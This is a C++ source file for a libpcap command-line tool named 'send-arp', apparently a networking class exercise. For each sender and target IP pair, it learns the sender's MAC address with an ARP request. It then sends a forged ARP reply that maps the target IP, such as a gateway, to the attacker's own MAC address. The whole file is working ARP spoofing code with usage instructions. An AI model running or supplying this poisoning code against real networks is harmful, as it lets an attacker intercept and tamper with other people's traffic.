#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/ether.h>
#include <stdint.h>

#define MAC_ALEN 18
#define IP_ALEN 32

#pragma pack(push, 1)
struct EthArpPacket{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


int main(int argc, char* argv[])
{
    if (argc % 2 != 0 || argc < 4 )
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    struct ifreq ifr;
    int32_t sockfd, ret;
    char my_mac[MAC_ALEN] = {0, };
    char my_ip[IP_ALEN] = {0, };
        
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if ( sockfd < 0 )
    {
        printf("Failed to get interface MAC address - socket failed\n");
        return -1;
    }
        
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if ( ret < 0 )
    {
        printf("ioctl failed!\n");
        close(sockfd);
        return -1;
    }
    strcpy((char *)my_mac, ether_ntoa((struct ether_addr *)ifr.ifr_hwaddr.sa_data));

    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if ( ret < 0 )
    {
        printf("ioctl failed!\n");
        close(sockfd);
        return -1;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, (char *)my_ip, sizeof(struct sockaddr));

    close(sockfd);
    for(int i = 0; i < (argc - 2) >> 1; i++)
    {
        char sender_mac[MAC_ALEN] = {0, };
        EthArpPacket request_packet, reply_packet;

        request_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // sender mac address
	    request_packet.eth_.smac_ = Mac(my_mac); // my mac address
	    request_packet.eth_.type_ = htons(EthHdr::Arp);

	    request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	    request_packet.arp_.pro_ = htons(EthHdr::Ip4);
	    request_packet.arp_.hln_ = Mac::SIZE;
	    request_packet.arp_.pln_ = Ip::SIZE;
	    request_packet.arp_.op_ = htons(ArpHdr::Request);
	    request_packet.arp_.smac_ = Mac(my_mac);
	    request_packet.arp_.sip_ = htonl(Ip((const char *)my_ip));
	    request_packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff");
	    request_packet.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
        if (res != 0) {
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }
        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            res = pcap_next_ex(handle, &header, &packet);
            if (res == -1 || res == -2)
            {
                printf("pcap_net_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
            if ( ((struct EthArpPacket *)packet) -> eth_.type_ == htons(EthHdr::Arp) )
            {
                strcpy(sender_mac, std::string( (((struct EthArpPacket *)packet) -> arp_).smac_ ).c_str());
                break;
            }
        }


        EthArpPacket fake_reply_packet;

	    fake_reply_packet.eth_.dmac_ = Mac(sender_mac); // sender mac address
	    fake_reply_packet.eth_.smac_ = Mac(my_mac); // my mac address
	    fake_reply_packet.eth_.type_ = htons(EthHdr::Arp);

	    fake_reply_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	    fake_reply_packet.arp_.pro_ = htons(EthHdr::Ip4);
	    fake_reply_packet.arp_.hln_ = Mac::SIZE;
	    fake_reply_packet.arp_.pln_ = Ip::SIZE;
	    fake_reply_packet.arp_.op_ = htons(ArpHdr::Reply);
	    fake_reply_packet.arp_.smac_ = Mac(my_mac);
	    fake_reply_packet.arp_.sip_ = htonl(Ip(argv[2 * i + 3]));
	    fake_reply_packet.arp_.tmac_ = Mac(sender_mac);
	    fake_reply_packet.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

	    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fake_reply_packet), sizeof(EthArpPacket));
	    if (res != 0) {
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }

    }
    
    
    pcap_close(handle);

}